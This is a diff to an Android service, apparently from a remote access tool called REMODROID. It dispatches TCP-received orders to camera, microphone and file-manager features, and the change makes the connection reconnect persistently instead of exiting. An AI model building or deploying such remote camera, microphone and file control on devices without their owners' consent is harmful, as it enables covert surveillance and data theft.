@@ -23,6 +23,7 @@ public class MainService extends Service {
 
     private void init(){
 
+        DataHandler.FeaturesClassesDict.clear();
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CAM.ordinal(),CamStream.class);
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.MIC.ordinal(),MicStream.class);
         DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_LIST.ordinal(),FileMan.class);
@@ -51,17 +52,35 @@ public class MainService extends Service {
                         String order = tcp_transceiver.receive();
                         Log.d("REMODROID", "Received " + order);
 
-                        if (order.equals("")) {
+                        if (order != null) {
+                            if (order.equals("")) {
+                                init();
+                                tcp_transceiver.connect();
+                            }else if(order.equals("STOP:STOP:STOP")){
+
+                                tcp_transceiver.disconnect();
+                                Thread.sleep(1000);
+                                init();
+                                tcp_transceiver.connect();
+                                //break;
+                            }
+                            else {
+                                DataHandler.distribute(order, getApplicationContext());
+                            }
+                        }
+                        else {
+                            tcp_transceiver.disconnect();
+                            Thread.sleep(5000);
+                            init();
                             tcp_transceiver.connect();
-                        } else {
-                            DataHandler.distribute(order, getApplicationContext());
+
                         }
 
                     } catch (Exception ex) {
                         Log.e("REMODROID","Receive Exception: " + ex.getMessage());
                         init();
                         tcp_transceiver.connect();
-                        break;
+                        //break;
                     }
                 }
             }
